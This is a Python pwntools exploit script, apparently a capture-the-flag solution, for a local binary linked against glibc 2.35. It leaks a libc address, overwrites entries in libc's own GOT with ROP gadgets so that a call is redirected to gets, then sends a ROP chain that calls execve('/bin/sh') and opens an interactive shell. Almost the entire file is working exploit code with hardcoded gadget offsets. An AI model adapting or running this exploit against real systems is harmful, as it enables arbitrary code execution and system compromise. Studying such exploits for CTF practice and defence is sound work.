#!/usr/bin/env python3
# coding=utf8

import inspect
from pwn import *

context.log_level = 'debug'

cn = process('./vuln-2.35')
libc = ELF("./libc-2.35.so")

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'

leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

'''
.got.plt:0000000000219090 off_219090      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
.got.plt:0000000000219098 off_219098      dq offset strlen        ; DATA XREF: j_strlen+4↑r
.got.plt:00000000002190A0 off_2190A0      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
.got.plt:00000000002190A8 off_2190A8      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
.got.plt:00000000002190B0 off_2190B0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
.got.plt:00000000002190B8 off_2190B8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r
.got.plt:00000000002190C0 off_2190C0      dq offset memrchr       ; DATA XREF: j_memrchr+4↑r
.got.plt:00000000002190C8 off_2190C8      dq offset _dl_deallocate_tls
.got.plt:00000000002190D0 off_2190D0      dq offset __tls_get_addr
.got.plt:00000000002190D8 off_2190D8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r

# overwrite strchrnul.got with:
.text:0000000000173E0E                 lea     rdi, [rsp+18h]
.text:0000000000173E13                 mov     edx, 20h ; ' '
.text:0000000000173E18                 call    j_strncpy

# overwrite strncpy.got with:
.text:00000000000C5BF8                 pop     rbx
.text:00000000000C5BF9                 pop     rbp
.text:00000000000C5BFA                 pop     r12
.text:00000000000C5BFC                 pop     r13
.text:00000000000C5BFE                 jmp     j_wmemset_0

# overwrite wmemset.got with `gets`
'''

strchrnul_gadget = lbase + 0x0000000000173E0E
strncpy_gadget = lbase + 0x00000000000C5BF8
gets_ptr = lbase + 0x0000000000080520

write_dest = lbase + 0x0000000000219090
write_payload = flat(
    strncpy_gadget,
    0xdead0001,
    0xdead0002,
    0xdead0003,
    0xdead0004,
    strchrnul_gadget,
    0xdead0005,
    0xdead0006,
    0xdead0007,
    gets_ptr,
)

prdi = lbase + 0x000000000002a3e5
binsh = lbase + 0x00000000001D8698
prsi = lbase + 0x000000000002be51
prdx_rbx = lbase + 0x00000000000904a9
execve_ptr = lbase + 0x00000000000EB080

rop_payload = flat(
    prdi, binsh,
    prsi, 0,
    prdx_rbx, 0, 0,
    execve_ptr,
)

ss("write payload to {}, length {}".format(
    hex(write_dest), hex(len(write_payload))))
sd(p64(write_dest))
sd(p64(len(write_payload)))
sd(write_payload)

# trigger gets(stack), send rop gadget
sleep(0.1)
sl(rop_payload)

interact()
